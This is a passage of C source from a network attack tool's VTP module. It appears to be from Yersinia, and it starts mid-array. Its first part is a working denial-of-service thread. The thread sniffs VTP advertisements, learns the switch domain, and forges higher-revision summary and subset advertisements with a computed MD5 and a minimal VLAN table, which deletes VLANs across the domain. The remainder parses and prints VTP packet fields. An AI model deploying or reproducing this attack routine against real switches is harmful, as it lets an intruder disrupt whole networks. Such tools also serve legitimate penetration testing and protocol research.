                            0x24, 0x00, 0x05, 0x0d, 0x03, 0xed, 0x05, 0xdc, 
                            0x00, 0x01, 0x8a, 0x8d, 0x74, 0x72, 0x6e, 0x65, 
                            0x74, 0x2d, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 
                            0x74, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
                            0x03, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0xf1, 0x00, 0x00, 0x00, 
                            0x00, 0x00, 0x0c, 0x20 };

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("vtp_th_dos_del_all pthread_sigmask()",errno);
       vtp_th_dos_crash_exit(attacks);
    }

    attacks = arg;
    
    vtp_data = attacks->data;

    gettimeofday(&now, NULL);

    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;
    
    if ((packet = calloc(1, SNAPLEN)) == NULL)
        vtp_th_dos_crash_exit(attacks);

    
    while (!attacks->attack_th.stop)
    {
        memset((void *)&vtp_data_learned,0,sizeof(struct vtp_data));
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
                              PROTO_VTP, NO_TIMEOUT);

        if (attacks->attack_th.stop)
           break;   
           
        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        ether = (struct libnet_802_3_hdr *) packet;
        
        if (!memcmp(vtp_data->mac_source,ether->_802_3_shost,6) )
          continue; /* Oops!! Its our packet... */

        pcap_aux.header = &header;
        pcap_aux.packet = packet;
                                                                                          
        if (vtp_load_values(&pcap_aux, &vtp_data_learned) < 0)
           continue;

        if ((vtp_data_learned.code != VTP_SUMM_ADVERT) 
             && (vtp_data_learned.code != VTP_SUBSET_ADVERT) )
           continue;

        if (vtp_generate_md5( NULL,
                              vtp_data->updater,
                              (vtp_data_learned.revision+1),
                              vtp_data_learned.domain, 
                              vtp_data_learned.dom_len, 
                              vlan_cisco,
                              sizeof(vlan_cisco), 
                              vtp_data->md5,
                              vtp_data_learned.version) < 0)
           break;

        vtp_data->code = VTP_SUMM_ADVERT;
        vtp_data->followers = 1;
        if (vtp_data_learned.dom_len > VTP_DOMAIN_SIZE)
        {
            vtp_data->dom_len = VTP_DOMAIN_SIZE;
            memcpy(vtp_data->domain,vtp_data_learned.domain,VTP_DOMAIN_SIZE);
        }
        else
        {
            vtp_data->dom_len = vtp_data_learned.dom_len;
            memcpy(vtp_data->domain,vtp_data_learned.domain,vtp_data_learned.dom_len);
        }                
        vtp_data->revision = vtp_data_learned.revision+1;
        
        usleep(200000);
        if (vtp_send(attacks)< 0)
           break;
        usleep(200000);
        
        vtp_data->code = VTP_SUBSET_ADVERT;
        vtp_data->seq = 1;
      
        vtp_data->vlan_info = vlan_cisco;
        vtp_data->vlans_len = sizeof(vlan_cisco);
        vtp_send(attacks);
        
        break; 
    }

    free(packet);
    
    vtp_th_dos_crash_exit(attacks);
}


void
vtp_th_dos_crash_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_exit(NULL);
}


int8_t
vtp_init_attribs(struct term_node *node)
{
    struct vtp_data *vtp_data;

    vtp_data = node->protocol[PROTO_VTP].tmp_data;

    attack_gen_mac(vtp_data->mac_source);

    vtp_data->mac_source[0] &= 0x0E; 

    parser_vrfy_mac("01:00:0c:cc:cc:cc",vtp_data->mac_dest);
    
    vtp_data->version = VTP_DFL_VERSION;
    
    memcpy(vtp_data->domain, VTP_DFL_DOMAIN,sizeof(VTP_DFL_DOMAIN));
    
    vtp_data->dom_len = VTP_DFL_DOM_LEN;
    
    vtp_data->code = VTP_DFL_CODE;

    vtp_data->start_val = 1;

    vtp_data->revision = 1;

    vtp_data->followers = 1;

    vtp_data->seq = 1;
   
    vtp_data->updater = ntohl(inet_addr("10.13.58.1"));
   
    return 0;
}


int8_t
vtp_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header)
{
    struct vtp_data *vtp_data;
    struct pcap_data pcap_aux;
    u_int8_t *packet, *cursor, got_vtp_packet = 0;
    dlist_t *p;
    struct interface_data *iface_data;
    
    vtp_data = data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else {
       iface_data = NULL;
    }

    while (!got_vtp_packet && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_VTP, NO_TIMEOUT);
        if (*stop)
        {
            free(packet);
            return -1;
        }

        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        pcap_aux.header = header;
        pcap_aux.packet = packet;
                                                                                          
        if (!vtp_load_values((struct pcap_data *)&pcap_aux, vtp_data))
           got_vtp_packet = 1;
        
    } /* While got */

    free(packet);

    return 0;
}


/* 
 * Return formated strings of each VTP field
 */
char **
vtp_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    u_int8_t *vtp_data, *ptr, *code, *cursor, i;
    char aux[MAX_VALUE_LENGTH + 1];
    u_int32_t *aux_long;
    u_int16_t *aux_short;
#ifdef LBL_ALIGN
    u_int32_t aux_long2;
    u_int8_t *aux2;
#endif
    char **field_values, *tlv;
    struct vlan_info *vlan_info;
    u_int16_t vlans_len=0;
char aux5[22];    

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_VTP].nparams, protocols[PROTO_VTP].parameters)) == NULL) {
	    thread_error("vtp_get_rpintable calloc()",errno);
	    return NULL;
    }
    
    ether = (struct libnet_802_3_hdr *) data->packet;
    vtp_data = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    snprintf(field_values[VTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
       ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
    /* Destination MAC */
    snprintf(field_values[VTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
       ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
    
    ptr = vtp_data; 
    
    /* VTP Version */
    snprintf(field_values[VTP_VERSION], 3, "%02X", *ptr);

    ptr++;
    code = ptr;

    snprintf(field_values[VTP_CODE], 3, "%02X", *code);

    /* VTP code */
    if (*code == VTP_SUMM_ADVERT)
       snprintf(field_values[VTP_FOLLOWERS], 4, "%03d", *(ptr+1));
    
    if (*code == VTP_SUBSET_ADVERT)
       snprintf(field_values[VTP_SEQ], 4, "%03d", *(ptr+1));
    
    ptr+=2;
   
    if (*ptr < 24)/*VTP_DOMAIN_SIZE )*/
    {
       memcpy(field_values[VTP_DOMAIN], (ptr+1), *ptr);
       field_values[VTP_DOMAIN][*ptr]=0;
    }
    else
    {
       memcpy(field_values[VTP_DOMAIN], (ptr+1), 24);
       field_values[VTP_DOMAIN][24]=0;    
       field_values[VTP_DOMAIN][23]='|';    
    }

    ptr+=33;

    aux_long = (u_int32_t *)ptr;

    switch(*code)
    {
       case VTP_SUMM_ADVERT:
            snprintf(field_values[VTP_REVISION], 11, "%010hd", ntohl(*aux_long));
              aux_long++;

#ifdef LBL_ALIGN 
    memcpy((void *)&aux_long2, (void *)aux_long,4);
    aux2 = libnet_addr2name4(aux_long2, LIBNET_DONT_RESOLVE);
    strncpy(field_values[VTP_UPDATER],aux2,16);
#else
    /* Source IP */
    strncpy(field_values[VTP_UPDATER], libnet_addr2name4(*aux_long, LIBNET_DONT_RESOLVE),
            16);
#endif
              aux_long++;
            memcpy(field_values[VTP_TIMESTAMP],(void *)aux_long, 12);
              aux_long+=3;
              ptr = (u_int8_t *)aux_long;
            snprintf(field_values[VTP_MD5], 24, "%02X%02X%02X%02X%02X%02X%02X%02X|",
                      *ptr, *(ptr+1),*(ptr+2),*(ptr+3),*(ptr+4), *(ptr+5),
*(ptr+6),*(ptr+7));/*,*(ptr+8)),*(ptr+9), *(ptr+10));
                      *(ptr+11),*(ptr+12),*(ptr+13),*(ptr+14),*(ptr+15));*/
       break;

       case VTP_SUBSET_ADVERT:
            snprintf(field_values[VTP_REVISION], 11, "%010hd", ntohl(*aux_long));
            field_values[VTP_MD5][0]=0;
            field_values[VTP_UPDATER][0] = 0;
            ptr+=4; /* Point to VLANs info */

            vlans_len = (data->packet + data->header->caplen) - ptr;
            
            cursor = ptr;
            i = 0;
#ifdef KKKKKKKKKKK            
            tlv = field_values[VTP_VLAN];
                
            while( ((cursor+sizeof(struct vlan_info)) < (ptr+vlans_len)) && (i<MAX_TLV) )
            {
               vlan_info = (struct vlan_info *) cursor;
               if ((cursor+vlan_info->len) > (ptr+vlans_len))
                  break;
               memset(aux,0,sizeof(aux));
               snprintf(aux, MAX_VALUE_LENGTH, "VLAN %d", ntohs(vlan_info->id));

               memset(aux5,0,sizeof(aux5));
               snprintf(aux5, 20, "%s", (char *)(vlan_info+1));
write_log(0," tlv[%d]=%p    %s  '%s'  vlan_info->len=%d   vlan_info->name_len=%d\n",VTP_VLAN,tlv,aux,aux5,vlan_info->len,vlan_info->name_len);

               memcpy(tlv,aux,strlen(aux));
               tlv+=strlen(aux)+1;
               if (vlan_info->len <= vlan_info->name_len)
                  break;
               if (vlan_info->name_len)
               {
                  if (vlan_info->name_len > MAX_VALUE_LENGTH)
                  {
                     memcpy(tlv,(void *)(vlan_info+1),MAX_VALUE_LENGTH);
                     tlv+=MAX_VALUE_LENGTH+1;
                  }
                  else
                  {
                     memcpy(tlv,(void *)(vlan_info+1),vlan_info->name_len);
                     tlv+=vlan_info->name_len+1;
                  }
               }
               else
               {
                  *tlv=0;
                  tlv++;
               }
               i++;
               cursor+=vlan_info->len;
write_log(0,"pasa cursor+=vlan_info->len...\n");
thread_usleep(500000);
            }
#endif
            
       break;
       
       case VTP_JOIN:
            field_values[VTP_MD5][0] = 0;
            field_values[VTP_REVISION][0] = 0;
            field_values[VTP_UPDATER][0] = 0;
       break;
       
       case VTP_REQUEST:
            aux_short = (u_int16_t *)aux_long;
            snprintf(field_values[VTP_STARTVAL], 6, "%05hd", ntohs(*aux_short));
            field_values[VTP_MD5][0] = 0;
            field_values[VTP_REVISION][0] = 0;
            field_values[VTP_UPDATER][0] = 0;
       break;
    }
     
    return (char **)field_values;
}


char **
vtp_get_printable_store(struct term_node *node)
{
    struct vtp_data *vtp_tmp;
    char **field_values;

    /* smac + dmac + version + code + domain + md5 + updater + revision +
     * timestamp + startval + followers + null = 12
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_VTP].nparams, protocols[PROTO_VTP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

	if (node == NULL)
		vtp_tmp = protocols[PROTO_VTP].default_values;
	else
        vtp_tmp = (struct vtp_data *) node->protocol[PROTO_VTP].tmp_data;

    /* Source MAC */
    snprintf(field_values[VTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       vtp_tmp->mac_source[0], vtp_tmp->mac_source[1], vtp_tmp->mac_source[2],
       vtp_tmp->mac_source[3], vtp_tmp->mac_source[4], vtp_tmp->mac_source[5]);

    /* Destination MAC */
    snprintf(field_values[VTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             vtp_tmp->mac_dest[0], vtp_tmp->mac_dest[1], vtp_tmp->mac_dest[2],
             vtp_tmp->mac_dest[3], vtp_tmp->mac_dest[4], vtp_tmp->mac_dest[5]);

    snprintf(field_values[VTP_VERSION], 3, "%02X", vtp_tmp->version);
    
    snprintf(field_values[VTP_CODE], 3, "%02X", vtp_tmp->code);

    memcpy(field_values[VTP_DOMAIN], vtp_tmp->domain, VTP_DOMAIN_SIZE);

    snprintf(field_values[VTP_MD5], 33, "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
	    vtp_tmp->md5[0],vtp_tmp->md5[1],vtp_tmp->md5[2],
	    vtp_tmp->md5[3],vtp_tmp->md5[4],vtp_tmp->md5[5],
	    vtp_tmp->md5[6],vtp_tmp->md5[7],vtp_tmp->md5[8],
	    vtp_tmp->md5[9],vtp_tmp->md5[10],vtp_tmp->md5[11],
	    vtp_tmp->md5[12],vtp_tmp->md5[13],vtp_tmp->md5[14],
	    vtp_tmp->md5[15]);

    parser_get_formated_inet_address(vtp_tmp->updater, field_values[VTP_UPDATER], 16);

    snprintf(field_values[VTP_REVISION], 11, "%010hd", vtp_tmp->revision);

    memcpy(field_values[VTP_TIMESTAMP], vtp_tmp->timestamp, 12);

    snprintf(field_values[VTP_STARTVAL], 6, "%05hd", vtp_tmp->start_val);            

    snprintf(field_values[VTP_FOLLOWERS], 4, "%03d", vtp_tmp->followers);

    snprintf(field_values[VTP_SEQ], 4, "%03d", vtp_tmp->seq);

    return (char **)field_values;
}


/* 
 * Load values from packet to data.
 */
int8_t 
vtp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct vtp_data *vtp;
    u_int8_t *vtp_data, *ptr;
    u_int32_t *aux_long;
    u_int16_t *aux_short;
#ifdef LBL_ALIGN
    u_int32_t aux_long2;
    u_int16_t *aux_short2;
#endif
    vtp = (struct vtp_data *)values;
    ether = (struct libnet_802_3_hdr *) data->packet;
    vtp_data = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    memcpy(vtp->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(vtp->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);
    
    ptr = vtp_data;
    
    if ( (ptr+sizeof(struct vtp_request)) > (data->packet + data->header->caplen))
        return -1; /* Undersized packet...*/
        
    /* VTP Version */
    vtp->version = *ptr;
    ptr++;
    
    /* VTP code */    
    vtp->code = *ptr;
    ptr++;

    switch (vtp->code)
    {
       case VTP_SUMM_ADVERT:
          vtp->followers = *ptr;
       break;
       case VTP_SUBSET_ADVERT:
          vtp->seq = *ptr;
       break;
    }
       
    ptr++;
   
    if (*ptr < VTP_DOMAIN_SIZE )
    {
       vtp->dom_len = *ptr;
       memcpy(vtp->domain, (ptr+1), *ptr);
       vtp->domain[*ptr]=0;
    }
    else
    {
       vtp->dom_len = VTP_DOMAIN_SIZE;
       memcpy(vtp->domain, (ptr+1), VTP_DOMAIN_SIZE);
       vtp->domain[VTP_DOMAIN_SIZE]= '\0';
    }

    ptr+=33;
    aux_long = (u_int32_t *)ptr;

    switch(vtp->code)
    {
       case VTP_SUMM_ADVERT:
#ifdef LBL_ALIGN
            memcpy((void *)&aux_long2, (void *)aux_long, 4);
            vtp->revision = ntohl(aux_long2);
#else
            vtp->revision = ntohl(*aux_long);
#endif
              aux_long++;
#ifdef LBL_ALIGN
            memcpy((void *)&aux_long2, (void *)aux_long, 4);
            vtp->updater = ntohl(aux_long2);
#else
            vtp->updater = ntohl(*aux_long);
#endif
              aux_long++;
            memcpy(vtp->timestamp,(void *)aux_long, 12);
              aux_long+=3;
            memcpy(vtp->md5, (void *)aux_long,16);
       break;

       case VTP_SUBSET_ADVERT:
#ifdef LBL_ALIGN
            memcpy((void *)&aux_long2, (void *)aux_long, 4);
            vtp->revision = ntohl(aux_long2);
#else
            vtp->revision = ntohl(*aux_long);
#endif
            vtp->vlans_len = (data->packet + data->header->caplen) - (ptr+4);
            vtp->vlan_info = (ptr+4);
       break;

       case VTP_REQUEST:
            aux_short = (u_int16_t *)ptr;
#ifdef LBL_ALIGN
            memcpy((void *)&aux_short2, (void *)aux_short, 4);
            vtp->start_val = ntohs(aux_short2);
#else
            vtp->start_val = ntohs(*aux_short);
#endif            
       break;

       case VTP_JOIN:
       break;
    }
    
    return 0;
}


int8_t 
vtp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct vtp_data *vtp_data;
	u_int16_t len;
    
    if (node == NULL)
       vtp_data = protocols[PROTO_VTP].default_values;
    else
       vtp_data = node->protocol[PROTO_VTP].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case VTP_SMAC:
           memcpy((void *)vtp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case VTP_DMAC:
           memcpy((void *)vtp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;
		
        /* Version */
        case VTP_VERSION:
	   vtp_data->version = *(u_int8_t *)value;
        break;

        /* Code */
        case VTP_CODE:
	   vtp_data->code = *(u_int8_t *)value;
        break;

        /* Followers */
        case VTP_FOLLOWERS:
	   vtp_data->followers = *(u_int8_t *)value;
        break;

        /* Seq */
        case VTP_SEQ:
	   vtp_data->seq = *(u_int8_t *)value;
        break;

        /* Domain */
        case VTP_DOMAIN:
           len = strlen(value);
           strncpy(vtp_data->domain, value, (len > VTP_DOMAIN_SIZE) ? VTP_DOMAIN_SIZE : len);
           vtp_data->dom_len = (len > VTP_DOMAIN_SIZE) ? VTP_DOMAIN_SIZE : len;
        break;

        /* Start value */
        case VTP_STARTVAL:
           vtp_data->start_val = *(u_int16_t *)value;
        break;

        /* Revision */
        case VTP_REVISION:
           vtp_data->revision = *(u_int32_t *)value;
        break;

        /* Updater */
        case VTP_UPDATER:
           vtp_data->updater = *(u_int32_t *)value;
        break;

        /* Timestamp */
        case VTP_TIMESTAMP:
           len = strlen(value);
           strncpy((char *)vtp_data->timestamp, value, (len > VTP_TIMESTAMP_SIZE) ? VTP_TIMESTAMP_SIZE : len);
        break;

        /* MD5 */
        case VTP_MD5:
           memcpy((void *)vtp_data->md5, (void *)value, 16);
        break;
    }

    return 0;
}


int8_t
vtp_end(struct term_node *node)
{
   return 0;
}
